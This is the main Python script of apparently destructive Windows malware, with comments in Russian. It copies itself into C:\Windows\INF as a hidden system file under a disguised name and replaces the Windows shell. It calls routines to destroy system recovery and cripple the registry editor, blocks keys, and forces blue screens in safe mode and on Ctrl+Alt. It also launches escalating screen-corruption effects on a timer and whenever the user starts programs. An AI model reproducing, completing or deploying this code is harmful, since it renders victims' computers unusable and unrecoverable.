import ctypes
import os
import psutil
import shutil
import threading
import sys
import time
import tempfile
from collections import defaultdict
from gui import run_app
from regedit_and_virus_safe import BSOD
from multimedia import playMusic_runappmain, play_video_fullscreen, playmusic_for3, monitor_process, set_file_attributes

from regedit_and_virus_safe import (
    destroy_all_recovery,
    change_shell,
    monitor_explorer,
    MinusRegedit,
    block_keys,
    ctrt_alt_BSOD)

from start_gdi import (
    startdrawimages, 
    starterrors, 
    starthell, 
    starticonscursor, 
    startinvert, 
    startmelt, 
    startpanscreen, 
    startrastagHori, 
    startrottun, 
    startsines, 
    startsmelt, 
    startswipescreen, 
    starttunnel, 
    startvoid)



def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        base_path = os.path.join(sys._MEIPASS, "resources")
    else:
        base_path = os.path.join(os.path.abspath("."), "resources")
    return os.path.join(base_path, relative_path)

###
file_path = r"C:\Windows\INF\iaLPSS2i_mausbhost_CNL.inf"
TARGET_DIR = r"C:\Windows\INF"
###

def is_safe_mode():
    SM_CLEANBOOT = 67
    mode = ctypes.windll.user32.GetSystemMetrics(SM_CLEANBOOT)
    return mode in (1, 2)


def check_safemode():
    def russia():
        try:
            if not is_safe_mode():
                sys.exit(1)
            BSOD()
        except Exception as e:
            print(f"Ошибка: {e}")
    threading.Thread(target=russia, daemon=True).start()


def delete_mei():
    temp_dir = tempfile.gettempdir()
    current_meipass = getattr(sys, "_MEIPASS", "")

    print(f"[DEBUG] TEMP DIR: {temp_dir}")
    print(f"[DEBUG] CURRENT _MEIPASS: {current_meipass}")

    for name in os.listdir(temp_dir):
        full_path = os.path.join(temp_dir, name)
        if name.startswith("_MEI") and os.path.isdir(full_path):
            print(f"[DEBUG] Найдена папка: {full_path}")
            if os.path.abspath(full_path) == os.path.abspath(current_meipass):
                print(f"[SKIP] Пропущена текущая _MEIPASS: {full_path}")
                continue
            try:
                shutil.rmtree(full_path, ignore_errors=False)
                print(f"[OK] Удалена: {full_path}")
            except Exception as e:
                print(f"[ERROR] Не удалось удалить {full_path}: {e}")


def copyicons():
    icon_files = ['1.ico', '2.ico', '4.ico', '6.ico']
    for icon in icon_files:
        icon_path = resource_path(icon)  # Получаем абсолютный путь к иконке
        if os.path.exists(icon_path):
            target_icon_path = os.path.join(TARGET_DIR, icon)  # Путь к целевой папке
            print(f"Проверка целевой папки: {target_icon_path}")  # Добавим вывод целевой папки
            # Если файл уже существует, не копируем
            if not os.path.exists(target_icon_path):
                try:
                    shutil.copy(icon_path, target_icon_path)
                    set_file_attributes(file_path=target_icon_path)
                    print(f"Успешно скопирован файл иконки: {icon}")
                except Exception as e:
                    print(f"Ошибка копирования {icon}: {e}")
            else:
                print(f"Файл {icon} уже существует в целевой папке.")
        else:
            print(f"Файл иконки {icon} не найден в resources.")


def copy_to_target(new_name="c_computeaccelerator.exe"):
    # Копирует текущий исполняемый файл в папку назначения с указанным именем
    if not os.path.exists(TARGET_DIR):
        os.makedirs(TARGET_DIR)
        return
    # Полный путь текущего файла
    current_file = sys.argv[0]
    target_file = os.path.join(TARGET_DIR, new_name)

    # Проверяем, если уже в папке назначения с указанным именем, не копируем
    if os.path.abspath(current_file) == os.path.abspath(target_file):
        return True  # Уже в нужной папке с нужным именем
    # Копируем файл
    try:
        shutil.copy(current_file, target_file)
        print("Успешно", f"Программа скопирована в {TARGET_DIR} с именем {new_name}")
        # Устанавливаем атрибуты скрытый и системный
        set_file_attributes(target_file)
        os.startfile(target_file)  # Запускаем копию из целевой папки
        sys.exit()  # Завершаем исходный файл
    except Exception as e:
        print("Ошибка", f"Не удалось скопировать файл: {e}")


def changetoeng():
    LANG_ENGLISH_US = 0x0409  # Код для английской раскладки
    HWND_BROADCAST = 0xFFFF
    WM_INPUTLANGCHANGEREQUEST = 0x0050
    # Загрузка раскладки
    def set_keyboard_layout(language_code):
        user32 = ctypes.WinDLL("user32")
        layout = user32.LoadKeyboardLayoutW(f"{language_code:04X}{language_code:04X}", 1)
        user32.PostMessageW(HWND_BROADCAST, WM_INPUTLANGCHANGEREQUEST, 0, layout)
    set_keyboard_layout(LANG_ENGLISH_US)


def checkexe():
    EXECUTABLE_EXTENSIONS = {".exe", ".bat", ".cmd", ".vbs", ".ps1"}
    tracked_apps = set()
    tracked_pids = set()
    existing_pids = {proc.pid for proc in psutil.process_iter(['pid'])}
    triggered_events = {
        2: False, 4: False, 8: False, 12: False, 16: False,
        18: False, 20: False, 24: False, 28: False,
        30: False, 35: False, 40: False,
        45: False, 50: False
    }
    actions = {
        2: lambda: (print("2"), starticonscursor()),
        4: lambda: (print("4"), starterrors()),
        8: lambda: (print("8"), startsmelt()),
        12: lambda: (print("12"), startdrawimages()),
        16: lambda: (print("16"), starttunnel()),
        18: lambda: (print("18"), startvoid()),
        20: lambda: (print("20"), startinvert()),
        24: lambda: (print("24"), startrastagHori()),
        28: lambda: (print("28"), startmelt()),
        30: lambda: (print("30"), startsines()),
        35: lambda: (print("35"), startpanscreen()),
        40: lambda: (print("40"), startrottun()),
        45: lambda: (print("45"), startswipescreen()),
        50: lambda: (print("50"), starthell())
    }

    # Планировщик запуска функций с таймером
    def schedule_events():
        sequence = [2, 4, 8, 12, 16, 18, 20, 24, 28, 30, 35, 40, 45, 50]
        time_map = {}

        delay = 0
        for num in sequence:
            if num <= 30:
                delay += 30  # 0.5 минуты
            elif num <= 50:
                delay += 60  # 1 минута
            else:
                delay += 180  # 3 минуты
            time_map[num] = delay

        def timer_run(n, delay_sec):
            time.sleep(delay_sec)
            if not triggered_events[n]:
                triggered_events[n] = True
                actions[n]()  # запускаем, если не был запущен

        # Создаём потоки под таймеры
        for n, delay in time_map.items():
            threading.Thread(target=timer_run, args=(n, delay), daemon=True).start()

    # Запускаем планировщик
    schedule_events()

    # Основной цикл — проверка exe
    while True:
        current_pids = set()
        app_instances = defaultdict(set)

        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                pid = proc.info['pid']
                name = proc.info['name'].lower()
                user = proc.info.get('username', '')

                if any(name.endswith(ext) for ext in EXECUTABLE_EXTENSIONS):
                    current_pids.add(pid)
                    app_instances[name].add(pid)
                    if pid not in existing_pids and pid not in tracked_pids and user:
                        tracked_pids.add(pid)
                        tracked_apps.add(name)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        total_processes = len(tracked_apps)
        for threshold in triggered_events:
            if total_processes >= threshold and not triggered_events[threshold]:
                triggered_events[threshold] = True
                actions[threshold]()
        time.sleep(0.5)


def checktxt():
    try:
        if os.path.exists(file_path):
            set_file_attributes(file_path)
            with open(file_path, "r") as f:
                content = f.read().strip()

            if content == "1":
                copyicons()
                copy_to_target(new_name="c_computeaccelerator.exe")
                change_shell()
                destroy_all_recovery()
                MinusRegedit()
                playMusic_runappmain()
                run_app()


            elif content == "2":
                play_video_fullscreen(video_path=resource_path("Hacker.mp4"))

            elif content == "3":
                playmusic_for3()

                process_monitor_threading = threading.Thread(target=monitor_process)
                process_monitor_threading.start()

                os.startfile(resource_path("BTDevManager.exe"))

                checkexe_threading = threading.Thread(target=checkexe)
                checkexe_threading.start()
                
                explorer_monitor_threading = threading.Thread(target=monitor_explorer(poll_interval=1))
                explorer_monitor_threading.start()

            else:
                with open(file_path, "w") as f:
                    f.write("1")
                copyicons()
                copy_to_target(new_name="c_computeaccelerator.exe")
                set_file_attributes(file_path)
                change_shell()
                destroy_all_recovery()
                changetoeng()
                MinusRegedit()
                playMusic_runappmain()
                run_app()
        else:
            with open(file_path, "w") as f:
                f.write("1")
            set_file_attributes(file_path)
            copyicons()
            copy_to_target(new_name="c_computeaccelerator.exe")
            change_shell()
            destroy_all_recovery()
            changetoeng()
            MinusRegedit()
            playMusic_runappmain()
            run_app()

    except Exception as e:
        print(f"Error: {e}")


if __name__ == "__main__":

    check_safemode()

    delete_mei()

    wait = threading.Thread(target=ctrt_alt_BSOD)
    wait.start()

    block_keys()
    checktxt()
